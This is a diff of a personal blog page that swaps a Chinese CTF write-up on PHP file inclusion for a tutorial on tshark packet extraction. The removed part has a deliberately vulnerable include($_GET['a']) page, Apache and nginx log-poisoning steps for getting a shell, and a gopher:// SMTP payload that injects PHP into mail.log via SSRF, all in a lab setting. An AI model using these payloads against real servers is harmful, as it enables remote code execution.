@@ -6,12 +6,12 @@
   <meta name="author" content="Imtinmin" />
   
   
-  <title>文件包含 | Imtinmin的小站</title>
+  <title>tshark 使用小结 | Imtinmin的小站</title>
 
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
   
-    <meta name="keywords" content="CTF,WEB,CTF,文件包含," />
+    <meta name="keywords" content="Tshark,MISC," />
   
 
   
@@ -164,12 +164,8 @@
   <div class="passage">
   <div class="passage-meta">
     <span>
-      <i class="fa fa-calendar"></i>2019-11-07
+      <i class="fa fa-calendar"></i>2019-12-18
     </span>
-    
-      <span>
-        | <a href="/categories/CTF/"><i class="fa fa-bookmark"></i>CTF</a>
-      </span>
     
     
       <span>
@@ -178,73 +174,48 @@
     
   </div>
   <h1 class="passage-title">
-    文件包含
+    tshark 使用小结
   </h1>
   
     <div class="passage-cover">
-      <figure style="background-image:url(https://i.loli.net/2019/11/07/NC3UTQVZjKDxq2u.png);"></figure>
+      <figure style="background-image:url(https://i.loli.net/2019/12/18/nGwZfxTBJ2AmiMW.png);"></figure>
     </div>
   
   <article class="passage-article">
-    <h1 id="apache-日志污染"><a href="#apache-日志污染" class="headerlink" title="apache 日志污染"></a>apache 日志污染</h1><p>需要能读到<code>apache</code>日志</p>
-<p><img src="https://i.loli.net/2019/11/07/x73ImtKQVhfJRSP.png" alt="apache2"></p>
-<p>虽然报400错误，但是会写入<code>access.log</code></p>
-<p><img src="https://i.loli.net/2019/11/07/a8gc3vYq5MOIGWR.png" alt="image.png"></p>
-<p>包含getshell</p>
+    <p>文章首发于先知：<a href="https://xz.aliyun.com/t/4527" target="_blank" rel="noopener">https://xz.aliyun.com/t/4527</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">做misc类题，巧妙运用tshark提取数据包数据提取时可以节约大量的时间，最近做到misc类题目，正好学习记录一下</span><br></pre></td></tr></table></figure>
+<p>官方文档：<a href="https://www.wireshark.org/docs/man-pages/tshark.html" target="_blank" rel="noopener">https://www.wireshark.org/docs/man-pages/tshark.html</a></p>
+<h2 id="常用操作"><a href="#常用操作" class="headerlink" title="常用操作"></a>常用操作</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-r 提取如wireshark表格中显示的封包摘要信息</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/wiki/imtinmin/photo/tshark/1.png" alt="-r"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-Y 使用filter过滤器</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/wiki/imtinmin/photo/tshark/2.png" alt="-Y"></p>
+<p>注意：需要加引号否则&amp;&amp;后面语句没用</p>
+<p><img src="https://raw.githubusercontent.com/wiki/imtinmin/photo/tshark/3.png" alt="-Y"></p>
+<p><img src="https://raw.githubusercontent.com/wiki/imtinmin/photo/tshark/4.png" alt="-Y"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-T 指出解析时输出的格式 </span><br><span class="line">     默认text </span><br><span class="line">     fields (需要增加-e参数)</span><br><span class="line">	 其他选项 ek|json|jsonraw|pdml|ps|psml|tabs</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-e 指定一个字段</span><br></pre></td></tr></table></figure>
+<p>字段名可以在wireshark表达式里面找,例如usb包的<code>Leftover Capture Data</code>字段<br><img src="https://raw.githubusercontent.com/wiki/imtinmin/photo/tshark/8.png" alt="-e"><br><img src="https://raw.githubusercontent.com/wiki/imtinmin/photo/tshark/9.png" alt="-e"><br>那么就可以用<code>usb capdata</code>提取这个字段<br><img src="https://raw.githubusercontent.com/wiki/imtinmin/photo/tshark/7.png" alt="-e"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark …… &gt;1.txt</span><br></pre></td></tr></table></figure>
+<p>将提取结果重定向输出到文本文件里</p>
+<h2 id="提取练习："><a href="#提取练习：" class="headerlink" title="提取练习："></a>提取练习：</h2><p><code>2018 红帽杯 Not only Wireshark</code></p>
 <blockquote>
-<p>要用burp，postman不然会被urlencode</p>
+<p>链接：<a href="https://pan.baidu.com/s/1qI1wnVrfdIbpEXvwV0AmAg" target="_blank" rel="noopener">https://pan.baidu.com/s/1qI1wnVrfdIbpEXvwV0AmAg</a><br>提取码：yh5n </p>
 </blockquote>
-<h1 id="nginx-日志污染getshell"><a href="#nginx-日志污染getshell" class="headerlink" title="nginx 日志污染getshell"></a>nginx 日志污染getshell</h1><p>参考链接： </p>
+<p>过滤http流，发现name参数后面的参数有端倪<br><img src="https://raw.githubusercontent.com/wiki/imtinmin/photo/tshark/5.png" alt="http"><br>利用tshark提取，配合linux的命令<br>字段名为http.request.uri<br><img src="https://raw.githubusercontent.com/wiki/imtinmin/photo/tshark/6.png" alt="http"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r Not\ Only\ Wireshark -Y http -T fields -e http.request.uri</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/wiki/imtinmin/photo/tshark/10.png" alt="http"><br><img src="https://raw.githubusercontent.com/wiki/imtinmin/photo/tshark/11.png" alt="http"><br>发现有我们需要的url，但是也有不需要的，这时候需要用linux的grep命令进行过滤<br><img src="https://raw.githubusercontent.com/wiki/imtinmin/photo/tshark/12.png" alt="http"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r Not\ Only\ Wireshark -Y http -T fields -e http.request.uri | grep <span class="string">"/sqli/example2.php?name="</span></span><br></pre></td></tr></table></figure>
+<p>再用<code>awk</code>命令提取<code>name=</code>后面的值，再用<code>tr</code>删掉换行符，使得输出成一行</p>
+<p><img src="https://raw.githubusercontent.com/wiki/imtinmin/photo/tshark/13.png" alt="http"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r Not\ Only\ Wireshark.pcapng -Y http -T fields -e http.request.uri | grep <span class="string">"/sqli/example2.php?name="</span>| awk -F <span class="string">'='</span> <span class="string">'&#123;print $2&#125;'</span>|tr -d <span class="string">"\n"</span></span><br></pre></td></tr></table></figure>
+<p><code>2017厦门邀请赛 traffic</code></p>
 <blockquote>
-<p><a href="https://www.ifobnn.com/lfiwithnginxlog.html" target="_blank" rel="noopener">https://www.ifobnn.com/lfiwithnginxlog.html</a></p>
-<p><a href="http://yulige.top/?p=346" target="_blank" rel="noopener">http://yulige.top/?p=346</a> </p>
+<p>链接：<a href="https://pan.baidu.com/s/1s_zcwzUM_86mpVTT75PRpw" target="_blank" rel="noopener">https://pan.baidu.com/s/1s_zcwzUM_86mpVTT75PRpw</a><br>提取码：6jul </p>
 </blockquote>
-<p>###　环境搭建</p>
-<p><code>index.php</code></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>($_GET[<span class="string">'a'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!--<span class="keyword">include</span>($_GET[<span class="string">'a'</span>]);--&gt;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>ubuntu16.04 需要把/var/log/nginx 目录权限设为645 </p>
-<p>error.log 设为至少644</p>
-</blockquote>
-<h3 id="写入"><a href="#写入" class="headerlink" title="写入"></a>写入</h3><p>用burp发包，浏览器会被编码,nginx 不会对get键编码</p>
-<p><img src="https://i.loli.net/2019/11/07/ZJkcIgFLnveSM68.png" alt=""></p>
-<p>成功写入</p>
-<p><img src="https://i.loli.net/2019/11/07/gD8jtVpoR3CqNAT.png" alt="nginx-include2.png"></p>
-<p>日志文件内容为</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@9056889a4768:/var/log/nginx# cat error.log </span><br><span class="line">2019/11/07 07:32:07 [error] 9486#9486: *4 FastCGI sent in stderr: &quot;PHP message: PHP Notice:  Undefined index: a in /var/www/html/index.php on line 2</span><br><span class="line">PHP message: PHP Warning:  include(): Filename cannot be empty in /var/www/html/index.php on line 2</span><br><span class="line">PHP message: PHP Warning:  include(): Failed opening &apos;&apos; for inclusion (include_path=&apos;.:/usr/share/php&apos;) in /var/www/html/index.php on line 2&quot; while reading response header from upstream, client: 112.96.102.200, server: _, request: &quot;GET /?&lt;?php phpinfo();?&gt; HTTP/1.1&quot;, upstream: &quot;fastcgi://unix:/run/php/php7.0-fpm.sock:&quot;, host: &quot;39.108.36.103:7777&quot;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>自己测试时，想清理日志可以</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@9056889a4768:/var/log/nginx# rm error.log </span><br><span class="line">root@9056889a4768:/var/log/nginx# touch error.log</span><br><span class="line">root@9056889a4768:/var/log/nginx# service nginx restart</span><br></pre></td></tr></table></figure>
-
-<p>不重启日志不会写进去</p>
-<hr>
-<h1 id="SMTP-日志投毒getshell-需要配合ssrf"><a href="#SMTP-日志投毒getshell-需要配合ssrf" class="headerlink" title="SMTP 日志投毒getshell(需要配合ssrf)"></a>SMTP 日志投毒getshell(需要配合ssrf)</h1><p> 出自2019年6月安恒杯的一题 </p>
-<blockquote>
-<p>本地ubuntu18.04打不成，不知道为啥</p>
-</blockquote>
-<p>出题人镜像:   </p>
-<blockquote>
-<p> registry.cn-hangzhou.aliyuncs.com/bypass/postfix</p>
-<p> 失效的话用：tinmin/gophersmtp</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull registry.cn-hangzhou.aliyuncs.com/bypass/postfix</span><br></pre></td></tr></table></figure>
-
-<p>用<code>Gopherus</code>构造payload</p>
-<p><img src="https://i.loli.net/2019/11/07/wpIVrzCTmHbOKhR.png" alt="image.png"></p>
-<p><code>payload</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:25/_MAIL%20FROM:%3Ctinmin%40tinmin.cn%3E%0ARCPT%20To:%3C%3Fphp%20phpinfo%28%29%3B%3F%3E%0ADATA%0AFrom:%3Ctinmin%40tinmin.cn%3E%0ASubject:test%0AMessage:test%0A.</span><br></pre></td></tr></table></figure>
-
-<p>发送&gt;&gt;&gt;&gt;&gt;</p>
-<p><img src="https://i.loli.net/2019/11/07/iOCfUB6IdQZWqMx.png" alt="curl"></p>
-<p>成功！</p>
-<p><img src="https://i.loli.net/2019/11/07/RZymX3OwBnTShEQ.png" alt="success"></p>
-<p>日志被污染成</p>
-<blockquote>
-<p>root@853c144383cb:/var/www/html# cat /var/log/mail.log<br>Nov  7 12:16:40 853c144383cb postfix/smtpd[127]: connect from localhost[127.0.0.1]<br>Nov  7 12:16:40 853c144383cb postfix/smtpd[127]: improper command pipelining after MAIL from localhost[127.0.0.1]: RCPT To:<?php phpinfo(); ?>\nDATA\nFrom:<a href="mailto:&#116;&#105;&#110;&#x6d;&#105;&#x6e;&#64;&#116;&#x69;&#x6e;&#109;&#105;&#x6e;&#x2e;&#99;&#110;" target="_blank" rel="noopener">&#116;&#105;&#110;&#x6d;&#105;&#x6e;&#64;&#116;&#x69;&#x6e;&#109;&#105;&#x6e;&#x2e;&#99;&#110;</a>\nSubject:test\nMessage:test\n.\r\n<br>Nov  7 12:16:40 853c144383cb postfix/smtpd[127]: warning: Illegal address syntax from localhost[127.0.0.1] in RCPT command: <?php phpinfo(); ?><br>Nov  7 12:16:40 853c144383cb postfix/smtpd[127]: warning: non-SMTP command from localhost[127.0.0.1]: From:<a href="mailto:&#x74;&#x69;&#x6e;&#x6d;&#x69;&#110;&#x40;&#x74;&#105;&#110;&#109;&#105;&#x6e;&#46;&#x63;&#x6e;" target="_blank" rel="noopener">&#x74;&#x69;&#x6e;&#x6d;&#x69;&#110;&#x40;&#x74;&#105;&#110;&#109;&#105;&#x6e;&#46;&#x63;&#x6e;</a><br>Nov  7 12:16:40 853c144383cb postfix/smtpd[127]: disconnect from localhost[127.0.0.1]</p>
-</blockquote>
+<p>比较难以捉摸,直接说步骤,要先发现开始icmp包中大量充斥的a字符串及heiheiehei!的提示<br> <img src="https://raw.githubusercontent.com/wiki/imtinmin/photo/tshark/14.png" alt="icmp"><br>然后提取icmp data字段的长度值<br> <img src="https://raw.githubusercontent.com/wiki/imtinmin/photo/tshark/15.png" alt="icmp"><br>字段名查询到是<code>Frame.len</code><br> <img src="https://raw.githubusercontent.com/wiki/imtinmin/photo/tshark/16.png" alt="icmp"><br>提取命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r 2.pcapng -Y &quot;icmp &quot;-T fields -e frame.len | tr &quot;\n&quot; &quot;,&quot;</span><br></pre></td></tr></table></figure>
+<p> <img src="https://raw.githubusercontent.com/wiki/imtinmin/photo/tshark/17.png" alt="icmp"></p>
 
   </article>
   <aside class="table-content" id="site-toc">
@@ -253,18 +224,16 @@
     <span>目录</span>
   </div>
   <div class="table-content-main">
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#apache-日志污染"><span class="toc-text">apache 日志污染</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#nginx-日志污染getshell"><span class="toc-text">nginx 日志污染getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#写入"><span class="toc-text">写入</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SMTP-日志投毒getshell-需要配合ssrf"><span class="toc-text">SMTP 日志投毒getshell(需要配合ssrf)</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#常用操作"><span class="toc-text">常用操作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#提取练习："><span class="toc-text">提取练习：</span></a></li></ol>
   </div>
 </aside>
   
   
     <div class="passage-tags">
      
-      <a href="/tags/WEB/"><i class="fa fa-tags"></i>WEB</a>
+      <a href="/tags/Tshark/"><i class="fa fa-tags"></i>Tshark</a>
      
-      <a href="/tags/CTF/"><i class="fa fa-tags"></i>CTF</a>
-     
-      <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"><i class="fa fa-tags"></i>文件包含</a>
+      <a href="/tags/MISC/"><i class="fa fa-tags"></i>MISC</a>
     
     </div>
   
@@ -388,10 +357,10 @@
 
 <div class="bottom-bar">
   <div class="bottom-bar-left">
-    <a href="/2019/11/09/2019-11-9-CTF/" data-enable="true">
+    <a href="/2019/12/18/2019-5-21-MISC-1/" data-enable="true">
       <i class="fa fa-arrow-left"></i>
     </a>
-    <a href="/2019/11/05/2019-11-5-CTF/" data-enable="true">
+    <a href="/2019/12/15/2019-12-16-WP/" data-enable="true">
       <i class="fa fa-arrow-right"></i>
     </a>
   </div>
